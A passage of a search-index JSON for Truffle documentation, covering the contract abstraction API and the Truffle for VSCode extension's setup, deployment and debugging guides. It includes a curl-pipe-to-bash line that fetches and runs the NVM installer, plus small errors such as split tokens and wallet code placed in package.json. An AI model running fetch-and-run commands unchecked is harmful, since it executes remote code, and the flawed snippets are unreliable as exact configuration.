section for a list of contract methods.", "title": "Contract Abstractions"}, {"location": "docs/truffle/reference/contract-abstractions/#usage", "text": "To obtain a contract abstraction you can require it with the contract name from the artifacts object. Outside of the console this is an object available in migration files, tests, and exec scripts. You would require your contract as follows: const MyContract = artifacts . require ( \"MyContract\" ); You can also obtain one in the developer console. Your contract types are available here and all you need to do is use the at , deployed , or new method. truffle ( development ) > const myContract = await MyContract . deployed (); You now have access to the following functions on MyContract , as well as many others: at() : Create an instance of MyContract that represents your contract at a specific address. deployed() : Create an instance of MyContract that represents the default address managed by MyContract . new() : Deploy a new version of this contract to the network, getting an instance of MyContract that represents the newly deployed instance. Each instance is tied to a specific address on the Ethereum network, and each instance has a 1-to-1 mapping from Javascript functions to contract functions. For instance, if your Solidity contract had a function defined someFunction(uint value) {} (solidity), then you could execute that function on the network like so: let deployed ; MyContract . deployed () . then (( instance ) => { deployed = instance ; return deployed . someFunction ( 5 ); }). then (( result ) => { // Do something with the result or continue with more transactions. }); You can also use async/await syntax which is often much less verbose. We will use async/await for the rest of this document but you may also use a promises for interfacing with contract methods as well. const deployed = await MyContract . deployed (); const result = await deployed . someFunction ( 5 ); // Do something with the result or continue with more transactions. See the processing transaction results section to learn more about the results object obtained from making transactions. Contract methods and events have an EventEmitter interface. So you can set up handlers like the following: const example = await artifacts . require ( \"Example\" ). deployed (); example . setValue ( 45 ) . on ( 'transactionHash' , hash => {}) . on ( 'receipt' , receipt => {}) . on ( 'error' , error => {}) . on ( 'confirmation' , ( num , receipt ) => {}) . then ( receipt => {}); example . ExampleEvent () . on ( 'data' , event => ... etc ... ) example . ExampleEvent () . once ( 'data' , event => ... etc ... )", "title": "Usage"}, {"location": "docs/truffle/reference/contract-abstractions/#api", "text": "There are two API's you'll need to be aware of. One is the static Contract Abstraction API and the other is the Contract Instance API. The Abstraction API is a set of functions that exist for all contract abstractions, and those function exist on the abstraction itself (i.e., MyContract.at() ). In contrast, the Instance API is the API available to contract instances -- i.e., abstractions that represent a specific contract on the network -- and that API is created dynamically based on functions available in your Solidity source file.", "title": "API"}, {"location": "docs/truffle/reference/contract-abstractions/#contract-abstraction-api", "text": "Each contract abstraction -- MyContract in the examples above -- have the following useful functions:", "title": "Contract Abstraction API"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractnewarg1-arg2-tx-params", "text": "This function takes whatever constructor parameters your contract requires and deploys a new instance of the contract to the network. There's an optional last argument which you can use to pass transaction parameters including the transaction from address, gas limit and gas price. This function returns a Promise that resolves into a new instance of the contract abstraction at the newly deployed address.", "title": "MyContract.new([arg1, arg2, ...], [tx params])"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractataddress", "text": "This function creates a new instance of the contract abstraction representing the contract at the passed in address. Returns a \"thenable\" object (not yet an actual Promise for backward compatibility). Resolves to a contract abstraction instance after ensuring code exists at the specified address.", "title": "MyContract.at(address)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractdeployed", "text": "Creates an instance of the contract abstraction representing the contract at its deployed address. The deployed address is a special value given to @truffle/contract that, when set, saves the address internally so that the deployed address can be inferred from the given Ethereum network being used. This allows you to write code referring to a specific deployed contract without having to manage those addresses yourself. Like at() , deployed() is thenable, and will resolve to a contract abstraction instance representing the deployed contract after ensuring that code exists at that location and that that address exists on the network being used.", "title": "MyContract.deployed()"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractlinkinstance", "text": "Link a library represented by a contract abstraction instance to MyContract. The library must first be deployed and have its deployed address set. The name and deployed address will be inferred from the contract abstraction instance. When this form of MyContract.link() is used, MyContract will consume all of the linked library's events and will be able to report that those events occurred during the result of a transaction. Libraries can be linked multiple times and will overwrite their previous linkage. Note: This method has two other forms, but this form is recommended.", "title": "MyContract.link(instance)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractlinkname-address", "text": "Link a library with a specific name and address to MyContract. The library's events will not be consumed using this form.", "title": "MyContract.link(name, address)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractlinkobject", "text": "Link multiple libraries denoted by an Object to MyContract. The keys must be strings representing the library names and the values must be strings representing the addresses. Like above, libraries' events will not be consumed using this form.", "title": "MyContract.link(object)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractnetworks", "text": "View a list of network ids this contract abstraction has been set up to represent.", "title": "MyContract.networks()"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractsetproviderprovider", "text": "Sets the web3 provider this contract abstraction will use to make transactions.", "title": "MyContract.setProvider(provider)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractsetnetworknetwork_id", "text": "Sets the network that MyContract is currently representing.", "title": "MyContract.setNetwork(network_id)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontracthasnetworknetwork_id", "text": "Returns a boolean denoting whether or not this contract abstraction is set up to represent a specific network.", "title": "MyContract.hasNetwork(network_id)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractdefaultsnew_defaults", "text": "Get's and optionally sets transaction defaults for all instances created from this abstraction. If called without any parameters it will simply return an Object representing current defaults. If an Object is passed, this will set new defaults. Example default transaction values that can be set are: MyContract . defaults ({ from : ..., gas : ..., gasPrice : ..., value : ... }) Setting a default from address, for instance, is useful when you have a contract abstraction you intend to represent one user (i.e., one address).", "title": "MyContract.defaults([new_defaults])"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractclonenetwork_id", "text": "Clone a contract abstraction to get another object that manages the same contract artifacts, but using a different network_id . This is useful if you'd like to manage the same contract but on a different network. When using this function, don't forget to set the correct provider afterward. const MyOtherContract = MyContract . clone ( 1337 );", "title": "MyContract.clone(network_id)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractnumberformat-number_type", "text": "You can set this property to choose the number format that abstraction methods return. The default behavior is to return BN. // Choices are: `[\"BigNumber\", \"BN\", \"String\"]. const Example = artifacts . require ( 'Example' ); Example . numberFormat = 'BigNumber' ;", "title": "MyContract.numberFormat = number_type"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontracttimeoutblock_timeout", "text": "This method allows you to set the block timeout for transactions. Contract instances created from this abstraction will have the specified transaction block timeout. This means that if a transaction does not immediately get mined, it will retry for the specified number of blocks.", "title": "MyContract.timeout(block_timeout)"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractautogas-boolean", "text": "If this is set to true, instances created from this abstraction will use web3.eth.estimateGas and then apply a gas multiplier to determine the amount of gas to include with the transaction. The default value for this is true . See gasMultiplier .", "title": "MyContract.autoGas = &lt;boolean&gt;"}, {"location": "docs/truffle/reference/contract-abstractions/#mycontractgasmultipliergas_multiplier", "text": "This is the value used when autoGas is enabled to determine the amount of gas to include with transactions. The gas is computed by using web3.eth.estimateGas and multiplying it by the gas multiplier. The default value is 1.25 .", "title": "MyContract.gasMultiplier(gas_multiplier)"}, {"location": "docs/truffle/reference/contract-abstractions/#contract-instance-api", "text": "Each contract instance is different based on the source Solidity contract, and the API is created dynamically. For the purposes of this documentation, let's use the following Solidity source code below: contract MyContract { uint public value ; event ValueSet ( uint val ); function setValue ( uint val ) { value = val ; emit ValueSet ( value ); } function getValue () view returns ( uint ) { return value ; } } From Javascript's point of view, this contract has three functions: setValue , getValue and value . This is because value is public and automatically creates a getter function for it.", "title": "Contract Instance API"}, {"location": "docs/truffle/reference/contract-abstractions/#making-a-transaction-via-a-contract-function", "text": "When we call setValue() , this creates a transaction. From Javascript: const result = await instance . setValue ( 5 ); // result object contains import information about the transaction console . log ( \"Value was set to\" , result . logs [ 0 ]. args . val ); The result object that gets returned looks like this: { tx : \"0x6cb0bbb6466b342ed7bc4a9816f1da8b92db1ccf197c3f91914fc2c721072ebd\" , receipt : { // The return value from web3.eth.getTransactionReceipt(hash) // See https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethgettransactionreceipt }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x728b4d1983cd00d93ae00b7adf76f78c1b32d922de636ead42e93f70cf58cdc9' , blockHash : '0xdce5e6c580267c9bf1d82bf0a167fa60509ef9fc520b8619d8183a8373a42035' , blockNumber : 19 , address : '0x035b8A9e427d93D178E2D22d600B779717696831' , type : 'mined' , id : 'log_70be22b0' , event : 'Transfer' , args : Result { '0' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '1' : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , '2' : < BN : 1 > , __length__ : 3 , _from : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _to : '0x7FEb9FAA5aED0FD547Ccc70f00C19dDe95ea54d4' , _value : < BN : 1 > } } ], } Note that if the function being executed in the transaction has a return value, you will not get that return value inside this result. You must instead use an event (like ValueSet ) and look up the result in the logs array.", "title": "Making a transaction via a contract function"}, {"location": "docs/truffle/reference/contract-abstractions/#explicitly-making-a-call-instead-of-a-transaction", "text": "We can call setValue() without creating a transaction by explicitly using .call : const value = await instance . setValue . call ( 5 ); This isn't very useful in this case, since setValue() sets things, and the value we pass won't be saved since we're not creating a transaction.", "title": "Explicitly making a call instead of a transaction"}, {"location": "docs/truffle/reference/contract-abstractions/#calling-getters", "text": "However, we can get the value using getValue() , using .call() . Calls are always free and don't cost any Ether, so they're good for calling functions that read data off the blockchain: const value = await instance . getValue . call (); // value reprsents the `value` storage object in the solidity contract // since the contract returns that value. Even more helpful, however is we don't even need to use .call when a function is marked as view or pure (or the deprecated constant ), because @truffle/contract will automatically know that that function can only be interacted with via a call: const value = await instance . getValue (); // val reprsents the `value` storage object in the solidity contract // since the contract returns that value.", "title": "Calling getters"}, {"location": "docs/truffle/reference/contract-abstractions/#overloaded-functions", "text": "Solidity supports a contract having multiple functions with the same name as long as the function argument types differ. And so you may find yourself in the situation of having a Truffle contract object with this property. You can invoke these \"overloaded\" functions just like you would a normal contract function. Truffle contract instances actually wrap web3's contract abstraction ( web3.eth.Contract ) and when you call an overloaded function, it uses the same function resolution that web3 uses. However, we must give a warning that this overloaded function resolution is often imprecise and can resolve to the wrong function when you call it. Consider the following contrived code sample: contract MyContract { uint256 public myUint ; string public myString ; string public myOtherString ; function setValues ( uint256 val , string str ) { myUint = val ; myString = str } function setValues ( string str , string otherStr ) { myString = str ; myOtherString = otherStr ; } function setValues ( uint256 val , string str , string otherStr ) { myUint = val ; myString = str ; myOtherString = otherStr ; } } This Solidity contract contains three functions named setValues , each taking a different type of input. In your JavaScript you might do something like the following: await instance . setValue ( 666 , \"this is not string cheese\" , \"this is string cheese\" ); As mentioned above, Truffle contract wraps web3 Contract objects and uses web3's overloaded function resolution. To resolve these functions, web3's strategy is to look at the number of arguments that the function was invoked with and try one that takes that many arguments. This works for some cases but is not ideal in that it can invoke the incorrect function. Take, for example, the case where we do something like the following: await instance . setValue ( \"this is not string cheese\" , \"this is string cheese\" ); We know that in our contract there are two functions named setValues that take two arguments. In the above case, we cannot be sure whether web3's resolution will resolve to the first or second function. The more precise way to reference functions like this is to use the methods property on the contract instance. The following is an example of how you access these methods: await instance . methods [ \"setValue(string,string)\" ]( \"this is not string cheese\" , \"this is string cheese\" ); The methods property is an object whose keys are strings that correspond to the contract function's names and signatures with no spaces. The values are the functions themselves. You can inspect the methods property to see the key names in this object and match the function signature. We recommend using this method of calling overloaded functions since it will unambiguously resolve to the correct function.", "title": "Overloaded functions"}, {"location": "docs/truffle/reference/contract-abstractions/#processing-transaction-results", "text": "When you make a transaction, you're given a result object that gives you a wealth of information about the transaction. You're given the transaction hash ( result.tx ), the decoded events (also known as logs; result.logs ), and a transaction receipt ( result.receipt ). In the below example, you'll receive the ValueSet() event because you triggered the event using the setValue() function: const result = await instance . setValue ( 5 ); // result.tx => transaction hash, string // result.logs => array of trigger events (1 item in this case) // result.receipt => receipt object", "title": "Processing transaction results"}, {"location": "docs/truffle/reference/contract-abstractions/#sending-ether-triggering-the-fallback-function", "text": "You can trigger the fallback function by sending a transaction to this function: const result = instance . sendTransaction ({...}); // Same result object as above. This is promisified like all available contract instance functions, and has the same API as web3.eth.sendTransaction without the callback. The to value will be automatically filled in for you. If you only want to send Ether to the contract a shorthand is available: const result = await instance . send ( web3 . toWei ( 1 , \"ether\" )); // Same result object as above.", "title": "Sending Ether / Triggering the fallback function"}, {"location": "docs/truffle/reference/contract-abstractions/#estimating-gas-usage", "text": "Run this function to estimate the gas usage: const result = instance . setValue . estimateGas ( 5 ); // result => estimated gas for this transaction", "title": "Estimating gas usage"}, {"location": "docs/vscode-ext/", "text": "What is Truffle for VSCode? \u00b6 Truffle for VSCode is a Visual Studio Code extension that simplifies how you create, build, debug, and deploy smart contracts on Ethereum and EVM-compatible blockchains. System requirements \u00b6 Supported operating systems: Windows 10 MacOS Ubuntu Node 14.0.x Git 2.10.x Get started by installing the Truffle for VSCode dependencies .", "title": "What is Truffle for VSCode?"}, {"location": "docs/vscode-ext/#what-is-truffle-for-vscode", "text": "Truffle for VSCode is a Visual Studio Code extension that simplifies how you create, build, debug, and deploy smart contracts on Ethereum and EVM-compatible blockchains.", "title": "What is Truffle for VSCode?"}, {"location": "docs/vscode-ext/#system-requirements", "text": "Supported operating systems: Windows 10 MacOS Ubuntu Node 14.0.x Git 2.10.x Get started by installing the Truffle for VSCode dependencies .", "title": "System requirements"}, {"location": "docs/vscode-ext/quickstart/", "text": "Quickstart \u00b6 Get started quickly with Truffle for VSCode by using the walkthrough on the VSCode welcome page, or following the instructions to create , build , and deploy contracts. Prerequisites \u00b6 Install the Truffle for VSCode extension . Install the Truffle for VSCode dependencies . Use the walkthrough \u00b6 The VSCode welcome page features a walkthrough that highlights tasks to build on Web3 using Truffle for VSCode. After selecting the walkthrough, the page displays instructions, screenshots, and links to perform tasks such as using Truffle commands, creating a Solidity project, and building and deploying smart contracts. Create a smart contract \u00b6 Truffle for VSCode uses Truffle Suite to help scaffold, build and deploy Solidity smart contracts. Developers familiar with Truffle Suite may use the Truffle command line (for example, truffle init ) directly from the VSCode terminal. You can also use Truffle for VSCode to scaffold out a project directory using the following steps: In the command palette , select Truffle: New Solidity Project . Select an empty directory to scaffold out your project. Choose a name for your contract. Press enter . Once complete, your project directory looks like the following: Your directory includes a simple contract and all the necessary files to build and deploy a simple, working contract to Truffle. Build a smart contract \u00b6 Build your smart contract by doing one of the following: In the command palette , select Truffle: Build Contracts . Select your contract Solidity ( .sol ) file, right-click and select Build Contracts . Once compiled, you have your contract, contract metadata (contract ABI, bytecode, etc.) available in the build directory. Deploy a smart contract to Truffle \u00b6 Once you have your compiled contract and a local Ganache instance running, deploy your contract by doing one of the following: In the command palette , select Truffle: Deploy Contracts . Select your contract Solidity ( .sol ) file, right-click and select Deploy Contracts . Once activated, the deployment process gives users the option to deploy a contract to a local Ethereum emulation environment, or various public Ethereum endpoints such as a testnet or mainnet. Learn more in Manage contracts .", "title": "Quickstart"}, {"location": "docs/vscode-ext/quickstart/#quickstart", "text": "Get started quickly with Truffle for VSCode by using the walkthrough on the VSCode welcome page, or following the instructions to create , build , and deploy contracts.", "title": "Quickstart"}, {"location": "docs/vscode-ext/quickstart/#prerequisites", "text": "Install the Truffle for VSCode extension . Install the Truffle for VSCode dependencies .", "title": "Prerequisites"}, {"location": "docs/vscode-ext/quickstart/#use-the-walkthrough", "text": "The VSCode welcome page features a walkthrough that highlights tasks to build on Web3 using Truffle for VSCode. After selecting the walkthrough, the page displays instructions, screenshots, and links to perform tasks such as using Truffle commands, creating a Solidity project, and building and deploying smart contracts.", "title": "Use the walkthrough"}, {"location": "docs/vscode-ext/quickstart/#create-a-smart-contract", "text": "Truffle for VSCode uses Truffle Suite to help scaffold, build and deploy Solidity smart contracts. Developers familiar with Truffle Suite may use the Truffle command line (for example, truffle init ) directly from the VSCode terminal. You can also use Truffle for VSCode to scaffold out a project directory using the following steps: In the command palette , select Truffle: New Solidity Project . Select an empty directory to scaffold out your project. Choose a name for your contract. Press enter . Once complete, your project directory looks like the following: Your directory includes a simple contract and all the necessary files to build and deploy a simple, working contract to Truffle.", "title": "Create a smart contract"}, {"location": "docs/vscode-ext/quickstart/#build-a-smart-contract", "text": "Build your smart contract by doing one of the following: In the command palette , select Truffle: Build Contracts . Select your contract Solidity ( .sol ) file, right-click and select Build Contracts . Once compiled, you have your contract, contract metadata (contract ABI, bytecode, etc.) available in the build directory.", "title": "Build a smart contract"}, {"location": "docs/vscode-ext/quickstart/#deploy-a-smart-contract-to-truffle", "text": "Once you have your compiled contract and a local Ganache instance running, deploy your contract by doing one of the following: In the command palette , select Truffle: Deploy Contracts . Select your contract Solidity ( .sol ) file, right-click and select Deploy Contracts . Once activated, the deployment process gives users the option to deploy a contract to a local Ethereum emulation environment, or various public Ethereum endpoints such as a testnet or mainnet. Learn more in Manage contracts .", "title": "Deploy a smart contract to Truffle"}, {"location": "docs/vscode-ext/how-to/add-a-wallet/", "text": "Add a wallet \u00b6 If you're using a Truffle box or you've created your own project structure, and you want to use the deployment options in the extension, you can add a wallet provider to your project. Steps \u00b6 Update your project to include the required package for the wallet. The underlying requirement is for truffle-hdwallet-provider . If you have an existing package.json as part of your project, just add the following to your dependencies section: \"truffle-hdwallet-provider\" : \"1.0.10\" If you don't have an existing package.json as part of your project, create one by running the following: npm init -y npm install truffle-hdwallet-provider@1.0.10 --save Update the Truffle configuration to include the wallet provider and a native Node package to access the file system. Add this to the top of package.json . const HDWalletProvider = require ( 'truffle-hdwallet-provider' ); const fs = require ( 'fs' ); To deploy locally, the wallet isn't required, but a network section for development is required. If this isn't present in package.json , you can add this to the network section. developme nt : { hos t : \"127.0.0.1\" , // Localhost (default: none) por t : 8545 , // Standard Ethereum port (default: none) net work_id : \"*\" , // Any network (default: none) } To deploy to another target, no other configuration is needed. When selecting to deploy contracts, the relevant network section is added dynamically to the Truffle configuration. To deploy to another target that has been manually added to the Truffle configuration, you must add the provider manually. Update the network section in the configuration to use this provider: provider : ne w HDWalle t Provider( fs .readFileSy n c('<pa t h t o a f ile wi t h a 12 work m ne mo n ic' , 'u tf -8 ') , \"<uri to rpc endpoint>\" ) Note: Some older Truffle boxes use a Truffle configuration file named truffle.js instead of truffle-config.js . This is required on Windows.", "title": "Add a wallet"}, {"location": "docs/vscode-ext/how-to/add-a-wallet/#add-a-wallet", "text": "If you're using a Truffle box or you've created your own project structure, and you want to use the deployment options in the extension, you can add a wallet provider to your project.", "title": "Add a wallet"}, {"location": "docs/vscode-ext/how-to/add-a-wallet/#steps", "text": "Update your project to include the required package for the wallet. The underlying requirement is for truffle-hdwallet-provider . If you have an existing package.json as part of your project, just add the following to your dependencies section: \"truffle-hdwallet-provider\" : \"1.0.10\" If you don't have an existing package.json as part of your project, create one by running the following: npm init -y npm install truffle-hdwallet-provider@1.0.10 --save Update the Truffle configuration to include the wallet provider and a native Node package to access the file system. Add this to the top of package.json . const HDWalletProvider = require ( 'truffle-hdwallet-provider' ); const fs = require ( 'fs' ); To deploy locally, the wallet isn't required, but a network section for development is required. If this isn't present in package.json , you can add this to the network section. developme nt : { hos t : \"127.0.0.1\" , // Localhost (default: none) por t : 8545 , // Standard Ethereum port (default: none) net work_id : \"*\" , // Any network (default: none) } To deploy to another target, no other configuration is needed. When selecting to deploy contracts, the relevant network section is added dynamically to the Truffle configuration. To deploy to another target that has been manually added to the Truffle configuration, you must add the provider manually. Update the network section in the configuration to use this provider: provider : ne w HDWalle t Provider( fs .readFileSy n c('<pa t h t o a f ile wi t h a 12 work m ne mo n ic' , 'u tf -8 ') , \"<uri to rpc endpoint>\" ) Note: Some older Truffle boxes use a Truffle configuration file named truffle.js instead of truffle-config.js . This is required on Windows.", "title": "Steps"}, {"location": "docs/vscode-ext/how-to/connect-to-infura/", "text": "Connect to Infura \u00b6 Truffle for VSCode allows users to create a new instance, or connect to an existing instance, of the Infura service directly from VSCode. This enables developers to reduce time moving between portal and IDE. Create a new Infura service \u00b6 If you don't have an existing Infura service deployed, you can create one in any account you have access to. Create a new Infura service by doing one of the following: In the command palette , select Truffle: Create a new network . Use the ellipsis menu in the Truffle - Networks view . Use the shortcuts in the Truffle - Networks view . A prompt displays to log in to the Infura service, if you haven't already. Enter the project name. Enter the project visibility. The default is public. Connect to existing Infura projects \u00b6 Connect to an existing Infura account/project by doing one of the following: In the command palette , select Truffle: Connect to network . Use the ellipsis menu in the Truffle - Networks view . Use the shortcuts in the Truffle - Networks view . A prompt displays to log in to the Infura service, if you haven't already. Select the project name. The nodes available from Infura display.", "title": "Connect to Infura"}, {"location": "docs/vscode-ext/how-to/connect-to-infura/#connect-to-infura", "text": "Truffle for VSCode allows users to create a new instance, or connect to an existing instance, of the Infura service directly from VSCode. This enables developers to reduce time moving between portal and IDE.", "title": "Connect to Infura"}, {"location": "docs/vscode-ext/how-to/connect-to-infura/#create-a-new-infura-service", "text": "If you don't have an existing Infura service deployed, you can create one in any account you have access to. Create a new Infura service by doing one of the following: In the command palette , select Truffle: Create a new network . Use the ellipsis menu in the Truffle - Networks view . Use the shortcuts in the Truffle - Networks view . A prompt displays to log in to the Infura service, if you haven't already. Enter the project name. Enter the project visibility. The default is public.", "title": "Create a new Infura service"}, {"location": "docs/vscode-ext/how-to/connect-to-infura/#connect-to-existing-infura-projects", "text": "Connect to an existing Infura account/project by doing one of the following: In the command palette , select Truffle: Connect to network . Use the ellipsis menu in the Truffle - Networks view . Use the shortcuts in the Truffle - Networks view . A prompt displays to log in to the Infura service, if you haven't already. Select the project name. The nodes available from Infura display.", "title": "Connect to existing Infura projects"}, {"location": "docs/vscode-ext/how-to/debug-smart-contracts/", "text": "Debug smart contracts \u00b6 Truffle for VSCode allows you to debug smart contracts using the VSCode debugger. Use the debugger \u00b6 Start the debugger by selecting Truffle: Debug Transaction in the command palette . Select the network to debug against. Then, select the hash of the transaction to debug. The VSCode debugger launches, and you can use typical debugger functions such as watch windows, view the call stack, and step in/out/over. When you initially deploy a contract, only the constructor function is called, so only the constructor function is available in the list of transaction hashes to debug. To debug other functions (for example, the sendCoin function in the MetaCoin.sol contract included in the Metacoin box ), you must invoke them first (generating resulting transaction hashes). You can execute a function using the Truffle console in a terminal window .", "title": "Debug smart contracts"}, {"location": "docs/vscode-ext/how-to/debug-smart-contracts/#debug-smart-contracts", "text": "Truffle for VSCode allows you to debug smart contracts using the VSCode debugger.", "title": "Debug smart contracts"}, {"location": "docs/vscode-ext/how-to/debug-smart-contracts/#use-the-debugger", "text": "Start the debugger by selecting Truffle: Debug Transaction in the command palette . Select the network to debug against. Then, select the hash of the transaction to debug. The VSCode debugger launches, and you can use typical debugger functions such as watch windows, view the call stack, and step in/out/over. When you initially deploy a contract, only the constructor function is called, so only the constructor function is available in the list of transaction hashes to debug. To debug other functions (for example, the sendCoin function in the MetaCoin.sol contract included in the Metacoin box ), you must invoke them first (generating resulting transaction hashes). You can execute a function using the Truffle console in a terminal window .", "title": "Use the debugger"}, {"location": "docs/vscode-ext/how-to/install-dependencies/", "text": "Install the Truffle for VSCode dependencies \u00b6 This page provides instructions for installing the Truffle for VSCode dependencies on Windows , MacOS , and Ubuntu . Once the dependencies are installed, when you restart VSCode the requirements page no longer appears. Windows \u00b6 Install the following dependencies if you don't have them already. Node.js \u00b6 Download the LTS version of Node.js . Install the downloaded .msi file in your Downloads folder. Check the following box on the Tools for Native Modules screen of the installer: If you didn't check the box, follow these steps . When asked if you want to install the tools at the end of the main installer screen, answer yes for all. You may have to approve a few elevated commands with the Windows security popups. If the previous step fails: Install the Visual Studio build tools with this installer . Select the build tools option and download and install. This is at least 1 GB, so it can take 30-40 minutes. In a command prompt, check if you installed Node.js successfully: C: \\U sers \\v italik>node --version v16.14.0 Also, check if NPM is installed: C: \\U sers \\v italik>npm --version 8 .3.1 Version numbers should be returned. Git \u00b6 Download the Git binary for Windows. Select the installer in your Downloads folder. You can select the default installation options, or change them to your needs. In a new command prompt, check if you installed Git properly: C: \\U sers \\v italik>git version git version 2 .35.1.windows.2 Truffle and Ganache \u00b6 In VSCode, on the Truffle for VSCode requirements page, select Install Truffle Suite and Install Ganache . Check if you installed Truffle and Ganache successfully using the output channel in VSCode: You should see no error messages. MacOS \u00b6 Node.js \u00b6 On MacOS, install Node.js reliably by using Node Version Manager (NVM). Install NVM \u00b6 Copy the NVM install script into the terminal: > curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh | bash Check if you installed NVM successfully: \u276f nvm --version 0 .39.0 Install Node \u00b6 Install the LTS version of Node.js in the same terminal window: > nvm install --lts <you will see some install info> Installing latest LTS version. Downloading and installing node v16.14.0... Downloading https://nodejs.org/dist/v16.14.0/node-v16.14.0-darwin-x64.tar.xz... ################################################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v16.14.0 ( npm v8.3.1 ) Installing default global packages from /usr/local/opt/nvm/default-packages... npm install -g --quiet faker-cli typescript yarn added 5 packages, and audited 6 packages in 5s found 0 vulnerabilities \u276f nvm use --lts Now using node v16.14.0 ( npm v8.3.1 ) Check if you installed Node.js and npm successfully: \u276f node --version v16.14.0 \u276f npm --version 8 .3.1 Git \u00b6 Git is usually already installed on MacOS. If you don't have Git installed, enter the following into the terminal: > xcode-select --install In a new terminal window, check if you installed Git successfully: \u276f git --version git version 2 .32.0 ( Apple Git-132 ) Truffle and Ganache \u00b6 You can install Truffle and Ganache from the Truffle for VSCode requirements page as for Windows , or you can install them using the command line: > npm i -g truffle > npm i -g ganache This installs the latest versions of both binaries. Ubuntu \u00b6 Installing Node.js, Truffle, and Ganache on Ubuntu is the same as for MacOS . You might need to install NVM using the second wget install script. Git \u00b6 Enter the following into the terminal: sudo apt install git In a new terminal window, check if you installed Git successfully: \u276f git --version git version 2 .32.0 ( Apple Git-132 )", "title": "Install dependencies"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#install-the-truffle-for-vscode-dependencies", "text": "This page provides instructions for installing the Truffle for VSCode dependencies on Windows , MacOS , and Ubuntu . Once the dependencies are installed, when you restart VSCode the requirements page no longer appears.", "title": "Install the Truffle for VSCode dependencies"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#windows", "text": "Install the following dependencies if you don't have them already.", "title": "Windows"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#nodejs", "text": "Download the LTS version of Node.js . Install the downloaded .msi file in your Downloads folder. Check the following box on the Tools for Native Modules screen of the installer: If you didn't check the box, follow these steps . When asked if you want to install the tools at the end of the main installer screen, answer yes for all. You may have to approve a few elevated commands with the Windows security popups. If the previous step fails: Install the Visual Studio build tools with this installer . Select the build tools option and download and install. This is at least 1 GB, so it can take 30-40 minutes. In a command prompt, check if you installed Node.js successfully: C: \\U sers \\v italik>node --version v16.14.0 Also, check if NPM is installed: C: \\U sers \\v italik>npm --version 8 .3.1 Version numbers should be returned.", "title": "Node.js"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#git", "text": "Download the Git binary for Windows. Select the installer in your Downloads folder. You can select the default installation options, or change them to your needs. In a new command prompt, check if you installed Git properly: C: \\U sers \\v italik>git version git version 2 .35.1.windows.2", "title": "Git"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#truffle-and-ganache", "text": "In VSCode, on the Truffle for VSCode requirements page, select Install Truffle Suite and Install Ganache . Check if you installed Truffle and Ganache successfully using the output channel in VSCode: You should see no error messages.", "title": "Truffle and Ganache"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#macos", "text": "", "title": "MacOS"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#nodejs_1", "text": "On MacOS, install Node.js reliably by using Node Version Manager (NVM).", "title": "Node.js"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#install-nvm", "text": "Copy the NVM install script into the terminal: > curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh | bash Check if you installed NVM successfully: \u276f nvm --version 0 .39.0", "title": "Install NVM"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#install-node", "text": "Install the LTS version of Node.js in the same terminal window: > nvm install --lts <you will see some install info> Installing latest LTS version. Downloading and installing node v16.14.0... Downloading https://nodejs.org/dist/v16.14.0/node-v16.14.0-darwin-x64.tar.xz... ################################################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v16.14.0 ( npm v8.3.1 ) Installing default global packages from /usr/local/opt/nvm/default-packages... npm install -g --quiet faker-cli typescript yarn added 5 packages, and audited 6 packages in 5s found 0 vulnerabilities \u276f nvm use --lts Now using node v16.14.0 ( npm v8.3.1 ) Check if you installed Node.js and npm successfully: \u276f node --version v16.14.0 \u276f npm --version 8 .3.1", "title": "Install Node"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#git_1", "text": "Git is usually already installed on MacOS. If you don't have Git installed, enter the following into the terminal: > xcode-select --install In a new terminal window, check if you installed Git successfully: \u276f git --version git version 2 .32.0 ( Apple Git-132 )", "title": "Git"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#truffle-and-ganache_1", "text": "You can install Truffle and Ganache from the Truffle for VSCode requirements page as for Windows , or you can install them using the command line: > npm i -g truffle > npm i -g ganache This installs the latest versions of both binaries.", "title": "Truffle and Ganache"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#ubuntu", "text": "Installing Node.js, Truffle, and Ganache on Ubuntu is the same as for MacOS . You might need to install NVM using the second wget install script.", "title": "Ubuntu"}, {"location": "docs/vscode-ext/how-to/install-dependencies/#git_2", "text": "Enter the following into the terminal: sudo apt install git In a new terminal window, check if you installed Git successfully: \u276f git --version git version 2 .32.0 ( Apple Git-132 )", "title": "Git"}, {"location": "docs/vscode-ext/how-to/manage-smart-contracts/", "text": "Manage smart contracts \u00b6 Truffle for VSCode allows developers to quickly scaffold out a directory with a basic smart contract and key files needed to deploy contracts locally or to public Ethereum networks. This page provides instructions on creating, building, and deploying smart contracts. Create a new Solidity project \u00b6 In the command palette , select Truffle: New Solidity Project . The extension asks 